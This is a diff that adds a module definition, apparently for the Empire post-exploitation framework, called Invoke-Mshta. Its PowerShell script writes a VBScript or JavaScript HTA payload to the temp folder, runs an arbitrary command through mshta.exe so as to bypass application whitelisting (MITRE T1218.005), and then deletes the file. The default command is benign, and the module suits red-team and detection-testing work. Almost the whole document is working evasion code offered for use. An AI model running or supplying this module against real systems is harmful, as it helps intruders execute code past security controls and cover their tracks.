@@ -1,0 +1,96 @@
+name: Invoke-Mshta
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Execute VBScript or JavaScript via mshta.exe for signed binary proxy
+  execution. Mshta.exe is a legitimate Microsoft utility used to execute
+  HTML Application (HTA) files. Adversaries abuse it to proxy execution
+  of malicious scripts, bypassing application whitelisting controls.
+  This module writes a short-lived HTA payload containing the specified
+  command to %TEMP%, invokes mshta.exe on it, and removes the file
+  afterwards.
+software: ''
+tactics: [TA0005]
+techniques: [T1218.005]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: PayloadType
+    description: Script engine to use for the HTA payload.
+    required: true
+    value: 'vbscript'
+    strict: true
+    suggested_values:
+      - vbscript
+      - javascript
+  - name: Command
+    description: The command to execute via mshta.
+    required: true
+    value: 'powershell.exe -nop -Command Write-Host HTA_Execution_Success'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-Mshta {
+      param(
+          [string]$PayloadType,
+          [string]$Command
+      )
+
+      $escaped = $Command -replace '"', '""'
+      $htaPath = "$env:TEMP\empire_payload.hta"
+
+      if ($PayloadType -eq "vbscript") {
+          $htaContent = @"
+  <html><head><script language="VBScript">
+  Set objShell = CreateObject("Wscript.Shell")
+  objShell.Run "$escaped"
+  self.close
+  </script></head></html>
+  "@
+      }
+      else {
+          $htaContent = @"
+  <html><head><script language="JavaScript">
+  var objShell = new ActiveXObject("WScript.Shell");
+  objShell.Run("$escaped");
+  window.close();
+  </script></head></html>
+  "@
+      }
+
+      Write-Output "[*] Writing HTA payload to: $htaPath"
+      try {
+          $htaContent | Out-File -FilePath $htaPath -Encoding ASCII -ErrorAction Stop
+      } catch {
+          Write-Output "[-] Failed to write HTA file: $($_.Exception.Message)"
+          return
+      }
+
+      Write-Output "[*] Executing mshta with $PayloadType engine..."
+      try {
+          $proc = Start-Process -FilePath "mshta.exe" -ArgumentList $htaPath -PassThru -ErrorAction Stop
+          $proc.WaitForExit(5000) | Out-Null
+          Write-Output "[+] Mshta execution completed (PID: $($proc.Id))."
+      } catch {
+          Write-Output "[-] Failed to launch mshta.exe: $($_.Exception.Message)"
+      }
+
+      Remove-Item -Path $htaPath -Force -ErrorAction SilentlyContinue
+      if (Test-Path $htaPath) {
+          Write-Output "[!] Warning: HTA file not cleaned up: $htaPath"
+      }
+  }
+script_end: Invoke-Mshta {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
